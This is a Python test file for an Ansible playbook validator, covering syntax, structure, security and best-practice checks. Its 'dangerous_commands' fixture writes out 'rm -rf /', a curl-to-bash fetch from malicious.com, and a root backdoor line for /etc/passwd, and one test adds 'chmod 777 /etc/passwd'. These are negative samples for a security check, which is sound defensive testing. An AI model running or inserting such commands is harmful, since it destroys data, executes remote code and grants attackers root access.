#!/usr/bin/env python3
"""
Unit Tests for Ansible Playbook Validation
Tests for Ansible playbook syntax, structure, and best practices validation
"""

import os
import tempfile
import yaml
from pathlib import Path
from unittest.mock import Mock, patch

import pytest


class TestAnsiblePlaybookValidation:
    """Test cases for Ansible playbook validation."""

    @pytest.fixture
    def valid_playbooks(self):
        """Collection of valid Ansible playbooks."""
        return {
            'server_deployment': '''---
- name: Deploy and configure server
  hosts: all
  become: yes
  gather_facts: yes
  
  vars:
    packages_to_install:
      - curl
      - wget
      - git
      - htop
    
  pre_tasks:
    - name: Update package cache
      apt:
        update_cache: yes
        cache_valid_time: 3600
      when: ansible_os_family == "Debian"
  
  tasks:
    - name: Install required packages
      package:
        name: "{{ packages_to_install }}"
        state: present
    
    - name: Ensure SSH is enabled
      systemd:
        name: ssh
        state: started
        enabled: yes
    
    - name: Configure firewall
      ufw:
        state: enabled
        policy: deny
        direction: incoming
      
    - name: Allow SSH through firewall
      ufw:
        rule: allow
        port: '22'
        proto: tcp
  
  post_tasks:
    - name: Verify services are running
      systemd:
        name: ssh
        state: started
      register: ssh_status
      
    - name: Display deployment status
      debug:
        msg: "Server deployment completed successfully"
      when: ssh_status.state == "started"
  
  handlers:
    - name: restart ssh
      systemd:
        name: ssh
        state: restarted
''',
            'docker_installation': '''---
- name: Install and configure Docker
  hosts: docker_hosts
  become: yes
  gather_facts: yes
  
  vars:
    docker_packages:
      - docker.io
      - docker-compose
    docker_users:
      - ubuntu
      - admin
  
  tasks:
    - name: Install Docker packages
      apt:
        name: "{{ docker_packages }}"
        state: present
        update_cache: yes
      
    - name: Start and enable Docker service
      systemd:
        name: docker
        state: started
        enabled: yes
        daemon_reload: yes
      
    - name: Add users to docker group
      user:
        name: "{{ item }}"
        groups: docker
        append: yes
      loop: "{{ docker_users }}"
      notify: restart docker
    
    - name: Create docker configuration directory
      file:
        path: /etc/docker
        state: directory
        owner: root
        group: root
        mode: '0755'
    
    - name: Configure Docker daemon
      copy:
        content: |
          {
            "storage-driver": "overlay2",
            "log-driver": "json-file",
            "log-opts": {
              "max-size": "10m",
              "max-file": "3"
            }
          }
        dest: /etc/docker/daemon.json
        owner: root
        group: root
        mode: '0644'
      notify: restart docker
  
  handlers:
    - name: restart docker
      systemd:
        name: docker
        state: restarted
''',
            'osquery_deployment': '''---
- name: Deploy OSQuery monitoring
  hosts: monitoring_targets
  become: yes
  gather_facts: yes
  
  vars:
    osquery_version: "5.10.2"
    fleet_url: "https://fleet.example.com"
    enroll_secret: "{{ vault_enroll_secret }}"
  
  pre_tasks:
    - name: Ensure required directories exist
      file:
        path: "{{ item }}"
        state: directory
        owner: root
        group: root
        mode: '0755'
      loop:
        - /etc/osquery
        - /var/log/osquery
  
  tasks:
    - name: Download OSQuery package
      get_url:
        url: "https://pkg.osquery.io/deb/osquery_{{ osquery_version }}-1.linux_amd64.deb"
        dest: "/tmp/osquery_{{ osquery_version }}.deb"
        mode: '0644'
      
    - name: Install OSQuery
      apt:
        deb: "/tmp/osquery_{{ osquery_version }}.deb"
        state: present
      
    - name: Configure OSQuery for FleetDM enrollment
      template:
        src: osquery_flags.j2
        dest: /etc/osquery/osquery.flags
        owner: root
        group: root
        mode: '0644'
      notify: restart osquery
    
    - name: Start and enable OSQuery service
      systemd:
        name: osqueryd
        state: started
        enabled: yes
        daemon_reload: yes
  
  handlers:
    - name: restart osquery
      systemd:
        name: osqueryd
        state: restarted
'''
        }

    @pytest.fixture
    def invalid_playbooks(self):
        """Collection of invalid Ansible playbooks."""
        return {
            'syntax_error': '''---
- name: Playbook with syntax errors
  hosts: all
  become: yes
  
  tasks:
    - name: Task with invalid YAML
      package:
        name: curl
        state: present
      invalid_yaml:
    - missing_value
''',
            'missing_required_fields': '''---
- hosts: all  # Missing name
  tasks:
    - package:  # Missing name
        name: curl
        state: present
''',
            'dangerous_commands': '''---
- name: Dangerous playbook
  hosts: all
  become: yes
  
  tasks:
    - name: Dangerous shell command
      shell: rm -rf /
      
    - name: Execute remote script
      shell: curl http://malicious.com/script.sh | bash
      
    - name: Modify system files dangerously
      lineinfile:
        path: /etc/passwd
        line: "hacker::0:0:root:/root:/bin/bash"
''',
            'insecure_practices': '''---
- name: Insecure playbook
  hosts: all
  become: yes
  
  vars:
    mysql_password: "plaintext_password"  # Insecure
    api_key: "secret_key_in_playbook"     # Insecure
  
  tasks:
    - name: Set password insecurely
      mysql_user:
        name: admin
        password: "{{ mysql_password }}"  # Should use vault
        
    - name: Download without verification
      get_url:
        url: http://untrusted-site.com/package.tar.gz  # HTTP not HTTPS
        dest: /tmp/package.tar.gz
        validate_certs: no  # Insecure
'''
        }

    @pytest.fixture
    def sample_inventory_files(self):
        """Sample Ansible inventory configurations."""
        return {
            'static_inventory': '''[web_servers]
web1.example.com ansible_host=192.168.1.10
web2.example.com ansible_host=192.168.1.11

[db_servers]
db1.example.com ansible_host=192.168.1.20
db2.example.com ansible_host=192.168.1.21

[production:children]
web_servers
db_servers

[production:vars]
ansible_user=ubuntu
ansible_ssh_private_key_file=~/.ssh/production_key
''',
            'dynamic_inventory': '''#!/usr/bin/env python3
import json

def get_inventory():
    return {
        'web_servers': {
            'hosts': ['web1.example.com', 'web2.example.com'],
            'vars': {
                'http_port': 80,
                'ansible_user': 'ubuntu'
            }
        },
        'db_servers': {
            'hosts': ['db1.example.com'],
            'vars': {
                'mysql_port': 3306
            }
        }
    }

if __name__ == '__main__':
    print(json.dumps(get_inventory(), indent=2))
'''
        }

    @pytest.mark.ansible
    def test_validate_playbook_syntax(self, valid_playbooks):
        """Test YAML syntax validation for Ansible playbooks."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_playbook_syntax
        
        for playbook_name, playbook_content in valid_playbooks.items():
            result = validate_playbook_syntax(playbook_content)
            
            assert result['valid'] == True, f"Playbook {playbook_name} should have valid syntax"
            assert 'yaml_errors' not in result or len(result['yaml_errors']) == 0

    @pytest.mark.ansible
    def test_invalid_playbook_syntax(self, invalid_playbooks):
        """Test detection of invalid YAML syntax."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_playbook_syntax
        
        # Test the syntax error playbook specifically
        syntax_error_playbook = invalid_playbooks['syntax_error']
        result = validate_playbook_syntax(syntax_error_playbook)
        
        assert result['valid'] == False
        assert 'yaml_errors' in result
        assert len(result['yaml_errors']) > 0

    @pytest.mark.ansible
    def test_playbook_structure_validation(self, valid_playbooks):
        """Test Ansible playbook structure validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_playbook_structure
        
        for playbook_name, playbook_content in valid_playbooks.items():
            result = validate_playbook_structure(playbook_content)
            
            assert result['valid'] == True, f"Playbook {playbook_name} should have valid structure"
            assert result['has_plays'] == True
            assert result['has_tasks'] == True

    @pytest.mark.ansible
    def test_required_fields_validation(self, invalid_playbooks):
        """Test validation of required playbook fields."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_required_fields
        
        missing_fields_playbook = invalid_playbooks['missing_required_fields']
        result = validate_required_fields(missing_fields_playbook)
        
        assert result['valid'] == False
        assert 'missing_fields' in result
        assert len(result['missing_fields']) > 0

    @pytest.mark.ansible
    def test_security_validation(self, invalid_playbooks):
        """Test security validation of playbooks."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_playbook_security
        
        # Test dangerous commands
        dangerous_playbook = invalid_playbooks['dangerous_commands']
        result = validate_playbook_security(dangerous_playbook)
        
        assert result['secure'] == False
        assert 'security_issues' in result
        assert len(result['security_issues']) > 0
        
        # Test insecure practices
        insecure_playbook = invalid_playbooks['insecure_practices']
        result = validate_playbook_security(insecure_playbook)
        
        assert result['secure'] == False
        assert 'security_issues' in result

    @pytest.mark.ansible
    def test_best_practices_validation(self, valid_playbooks):
        """Test Ansible best practices validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_best_practices
        
        for playbook_name, playbook_content in valid_playbooks.items():
            result = validate_best_practices(playbook_content)
            
            # Valid playbooks should follow most best practices
            assert result['score'] > 70, f"Playbook {playbook_name} should follow best practices"
            
            # Check specific best practices
            assert result['has_task_names'] == True
            assert result['uses_become_appropriately'] == True

    def test_inventory_validation(self, sample_inventory_files):
        """Test inventory file validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_inventory
        
        static_inventory = sample_inventory_files['static_inventory']
        result = validate_inventory(static_inventory, inventory_type='static')
        
        assert result['valid'] == True
        assert result['host_count'] > 0
        assert result['group_count'] > 0

    def test_ansible_lint_integration(self, valid_playbooks, temp_dir):
        """Test integration with ansible-lint tool."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import run_ansible_lint
        
        # Create temporary playbook file
        playbook_content = valid_playbooks['server_deployment']
        playbook_path = temp_dir / 'test_playbook.yml'
        playbook_path.write_text(playbook_content)
        
        with patch('subprocess.run') as mock_run:
            # Mock successful ansible-lint run
            mock_run.return_value = Mock(
                returncode=0,
                stdout='',
                stderr=''
            )
            
            result = run_ansible_lint(str(playbook_path))
            
            assert result['lint_passed'] == True
            mock_run.assert_called_once()

    def test_variable_validation(self):
        """Test Ansible variable usage validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_variables
        
        playbook_with_vars = '''---
- name: Test playbook with variables
  hosts: all
  vars:
    defined_var: "value"
    another_var: 123
  
  tasks:
    - name: Use defined variable
      debug:
        msg: "{{ defined_var }}"
    
    - name: Use undefined variable
      debug:
        msg: "{{ undefined_var }}"
'''
        
        result = validate_variables(playbook_with_vars)
        
        assert result['undefined_variables'] == ['undefined_var']
        assert 'defined_var' not in result['undefined_variables']

    def test_module_validation(self):
        """Test Ansible module usage validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_modules
        
        playbook_with_modules = '''---
- name: Test module validation
  hosts: all
  
  tasks:
    - name: Valid module
      package:
        name: curl
        state: present
    
    - name: Deprecated module
      yum:  # Should suggest using 'package' instead
        name: wget
        state: present
    
    - name: Unknown module
      non_existent_module:
        param: value
'''
        
        result = validate_modules(playbook_with_modules)
        
        assert 'deprecated_modules' in result
        assert 'unknown_modules' in result
        assert len(result['unknown_modules']) > 0

    def test_task_complexity_validation(self, valid_playbooks):
        """Test task complexity analysis."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import analyze_task_complexity
        
        complex_playbook = valid_playbooks['docker_installation']
        result = analyze_task_complexity(complex_playbook)
        
        assert 'complexity_score' in result
        assert 'task_count' in result
        assert 'handler_count' in result
        assert result['task_count'] > 0

    def test_conditional_logic_validation(self):
        """Test conditional logic validation in playbooks."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_conditionals
        
        playbook_with_conditionals = '''---
- name: Test conditional validation
  hosts: all
  
  tasks:
    - name: Valid conditional
      package:
        name: curl
        state: present
      when: ansible_os_family == "Debian"
    
    - name: Complex conditional
      service:
        name: apache2
        state: started
      when: 
        - ansible_os_family == "Debian"
        - ansible_distribution_major_version|int >= 18
    
    - name: Invalid conditional syntax
      debug:
        msg: "test"
      when: invalid_syntax ==
'''
        
        result = validate_conditionals(playbook_with_conditionals)
        
        assert 'conditional_errors' in result
        assert len(result['conditional_errors']) > 0  # Should catch the invalid syntax

    def test_handler_validation(self, valid_playbooks):
        """Test handler definition and usage validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_handlers
        
        docker_playbook = valid_playbooks['docker_installation']
        result = validate_handlers(docker_playbook)
        
        assert result['handlers_defined'] > 0
        assert result['handlers_called'] > 0
        assert 'unused_handlers' in result
        assert 'undefined_handlers' in result

    def test_file_inclusion_validation(self):
        """Test validation of included files and roles."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_inclusions
        
        playbook_with_includes = '''---
- name: Test file inclusion
  hosts: all
  
  pre_tasks:
    - include_tasks: pre_setup.yml
  
  roles:
    - common
    - { role: nginx, nginx_port: 80 }
  
  tasks:
    - import_tasks: main_tasks.yml
    - include_vars: variables.yml
'''
        
        result = validate_inclusions(playbook_with_includes)
        
        assert 'included_files' in result
        assert 'missing_files' in result  # May be missing in test environment
        assert 'roles_used' in result

    def test_privilege_escalation_validation(self):
        """Test privilege escalation (become) validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_privilege_escalation
        
        playbook_with_become = '''---
- name: Test privilege escalation
  hosts: all
  become: yes
  
  tasks:
    - name: System task requiring root
      package:
        name: nginx
        state: present
    
    - name: User task not requiring root
      debug:
        msg: "This doesn't need root"
      become: no
    
    - name: Dangerous escalation
      shell: |
        chmod 777 /etc/passwd
      become: yes
'''
        
        result = validate_privilege_escalation(playbook_with_become)
        
        assert 'inappropriate_escalation' in result
        assert 'security_risks' in result

    @pytest.mark.ansible
    def test_comprehensive_playbook_validation(self, valid_playbooks):
        """Test comprehensive validation combining all checks."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import AnsiblePlaybookValidator
        
        validator = AnsiblePlaybookValidator()
        
        for playbook_name, playbook_content in valid_playbooks.items():
            result = validator.validate(playbook_content)
            
            assert result['valid'] == True, f"Comprehensive validation failed for {playbook_name}"
            assert result['syntax_valid'] == True
            assert result['structure_valid'] == True
            assert result['security_score'] > 70
            assert result['best_practices_score'] > 70

    def test_playbook_performance_analysis(self, valid_playbooks):
        """Test playbook performance analysis."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import analyze_performance
        
        server_playbook = valid_playbooks['server_deployment']
        result = analyze_performance(server_playbook)
        
        assert 'estimated_execution_time' in result
        assert 'parallelizable_tasks' in result
        assert 'bottleneck_tasks' in result
        assert 'optimization_suggestions' in result

    def test_role_validation(self):
        """Test Ansible role structure validation."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import validate_role_structure
        
        # Mock role directory structure
        role_structure = {
            'tasks/main.yml': '''---
- name: Install package
  package:
    name: nginx
    state: present
''',
            'handlers/main.yml': '''---
- name: restart nginx
  service:
    name: nginx
    state: restarted
''',
            'vars/main.yml': '''---
nginx_port: 80
''',
            'meta/main.yml': '''---
galaxy_info:
  role_name: nginx
  author: admin
  description: Nginx installation role
  min_ansible_version: 2.9
dependencies: []
'''
        }
        
        result = validate_role_structure(role_structure)
        
        assert result['valid'] == True
        assert result['has_tasks'] == True
        assert result['has_handlers'] == True
        assert result['has_meta'] == True

    @pytest.mark.parametrize("check_type", [
        'syntax',
        'structure', 
        'security',
        'best_practices',
        'variables',
        'modules'
    ])
    def test_individual_validation_checks(self, valid_playbooks, check_type):
        """Test individual validation check types."""
        from gough.containers.management_server.py4web_app.lib.ansible_validator import run_validation_check
        
        playbook_content = valid_playbooks['server_deployment']
        result = run_validation_check(playbook_content, check_type)
        
        assert 'valid' in result
        assert result['check_type'] == check_type